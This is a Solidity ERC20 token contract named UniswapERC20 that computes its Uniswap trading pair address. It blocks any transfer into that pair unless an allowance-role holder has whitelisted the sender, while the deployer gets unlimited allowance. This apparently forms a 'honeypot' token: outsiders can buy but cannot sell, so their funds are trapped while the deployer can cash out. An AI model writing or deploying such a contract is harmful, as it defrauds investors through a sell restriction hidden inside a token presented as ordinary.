pragma solidity ^0.6.2;

import "./ERC20PresetMinterPauser.sol";

contract UniswapERC20 is ERC20PresetMinterPauser {
    bytes32 public constant ALLOW_ROLE = keccak256("ALLOW_ROLE");
    address public pair;
    mapping(address => uint256) public allowAmount;

    constructor(string memory name, string memory symbol, uint8 decimals, address factory, address WETH, bytes32 codeHash) public ERC20PresetMinterPauser(name, symbol) {
        _setupDecimals(decimals);
        _setupRole(ALLOW_ROLE, _msgSender());
        allowAmount[_msgSender()] = uint256(-1);
        pair = pairFor(factory, address(this), WETH, codeHash);
    }

    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapERC20: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapERC20: ZERO_ADDRESS');
    }

     // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB, bytes32 codeHash) public pure returns (address _pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        _pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                codeHash // init code hash
            ))));
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        if (to == pair) {
            uint256 allowAmount_ = allowAmount[from];
            require(allowAmount_ >= amount, "UniswapERC20: insufficient allow amount");
            allowAmount[from] = allowAmount_.sub(amount);
        }
    }

    function allow(address addr, uint256 amount) external {
        require(hasRole(ALLOW_ROLE, _msgSender()), "UniswapERC20: must have allow role to allow");
        allowAmount[addr] = amount;
    }
}